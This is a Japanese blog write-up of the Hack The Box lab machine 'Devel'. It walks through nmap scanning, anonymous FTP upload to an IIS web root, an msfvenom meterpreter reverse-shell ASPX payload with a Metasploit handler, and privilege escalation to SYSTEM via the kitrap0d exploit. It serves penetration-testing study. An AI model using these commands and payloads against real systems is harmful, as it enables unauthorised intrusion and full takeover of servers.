# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。  
主に記録用として記しています。  
現在のランクはHackerです。  
間違っていることも多いかと思いますが、よろしくお願いします。  
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
Twitter:@yukitsukai1731

# Devel
HackTheBox公式より  
![スクリーンショット 2020-06-05 14.58.04.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/05813241-84a5-8664-18d2-6e6d4cf99ec2.png)


Devel, while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.

Devel は比較的単純ですが、いくつかのデフォルトプログラムの設定に関連したセキュリティリスクを示しています。一般に公開されているエクスプロイトを使って完成させることができる初心者レベルのマシンです。

# スキャン
Devel(10.10.10.5)に対して、スキャンを行います。
まずnmapからスキャンを開始します。
## nmap 

```
nmap -sC -sV -Pn -oN devel.nmap 10.10.10.5
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力
- -Pn...ping送信をせずにスキャンを行う

```
kali@kali:~/htb$ nmap -sC -sV -Pn -oN devel.nmap 10.10.10.5
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 01:52 EDT
Nmap scan report for 10.10.10.5
Host is up (0.25s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.79 seconds
```
空いてるポートが21番と80番が空いています。
21番はAnonymousログインが許可されています。
80番ポートはMicrosoft IIS httpd 7.5で動いていることが分かります。
とりあえず最初にAnonymousでログインして何かできないか探ってみましょう。

```
kali@kali:~$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```

welcome.pngというものが配置されていました。一度どんなものか確かめるためにダウンロードしてみましょう。

```
wget http://10.10.10.5/welcome.png
```

![スクリーンショット 2020-06-05 15.11.28.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/053c2c7d-5515-7d5e-a9b1-f96f6290cdea.png)

このような画像が手に入りました。
次に80番ポートが空いているので、ブラウザからアクセスしてみましょう。
![スクリーンショット 2020-06-05 15.05.31.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/7684b829-238c-1fdd-625d-f7f1a4e3da8f.png)

先ほどの画像がトップページに表示されました。
このことからFTPの接続先ディレクトリはHTTPのサーバと同じディレクトリになっている可能性が高いです。
このことから簡単なhtmlファイルを作成し、FTPからアップロードして表示できるか確かめてみましょう。

```
kali@kali:~/htb/Devel$ echo "<html><body>testページ</body></html>" > test.html
kali@kali:~/htb/Devel$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put test.html
local: test.html remote: test.html
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
41 bytes sent in 0.00 secs (690.3287 kB/s)
ftp> 
```
![スクリーンショット 2020-06-05 15.18.09.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e4943b70-bbd7-9032-2179-96d833d636e5.png)
ページという文字を含めてしまったため、文字化けしていますが、しっかり送信できていることが分かります。

これを利用してmsfvenomを利用して、リバースシェルできるようにしましょう。
Microsoft IISなのでaspxで生成してリバースシェルを獲得しようと思います。

# 侵入(パート1)
まずはmsfvenomを使用してペイロードを生成します。

```
kali@kali:~/htb/Devel$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f aspx > devel.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2818 bytes
```
- -p...ペイロード
- LHOST...接続を受けるホストのIP
- LPORT...接続を受けるホストのポート
- -f...フォーマット


これを先ほどと同じようにftpを使って流し込みます。

```
kali@kali:~/htb/Devel$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put devel.aspx
local: devel.aspx remote: devel.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2854 bytes sent in 0.00 secs (23.4637 MB/s)
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
06-08-20  05:31PM                 2854 devel.aspx
03-17-17  05:37PM                  689 iisstart.htm
06-08-20  05:17PM                   41 test.html
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
ちゃんとアップロードできていることが分かります。
次に受けるハンドラを設定します。

```
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.14.7
LHOST => 10.10.14.7
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.7       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.7:4444
```

最後の先ほどアップロードしたaspxファイルを実行します。

![スクリーンショット 2020-06-05 15.35.02.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/8c8a82b5-bb3e-30ff-1447-74d74288dba1.png)

```
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.7:4444 
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.10.5:49159) at 2020-06-05 02:34:49 -0400

meterpreter > getuid
Server username: IIS APPPOOL\Web
```

すると、待ち受けてたハンドラにリバースシェル接続が来て、シェルを取ることができます。
しかし現在のままでは管理者権限ではないので、さらに権限昇格を狙う必要があります。

# 特権エスカレーション
meterpreterで接続しているので、このままlocal_exploit_suggesterモジュールを用いて権限の昇格を狙いたいと思います。

```
meterpreter > background 
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > show option
[-] Invalid parameter "option", use "show -h" for more information
msf5 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 31 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```
いろいろ使えそうなものが出てきました。
上の方から順に使っていきましょう。

```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
msf5 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf5 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.7
LHOST => 10.10.14.7
msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.7:4444 
[*] Launching notepad to host the exploit...
[+] Process 4040 launched.
[*] Reflectively injecting the exploit DLL into 4040...
[*] Injecting exploit into 4040 ...
[*] Exploit injected. Injecting payload into 4040...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.7:4444 -> 10.10.10.5:49159) at 2020-06-05 03:02:45 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
これでNT AUTHORITY\SYSTEMを手に入れることができました。
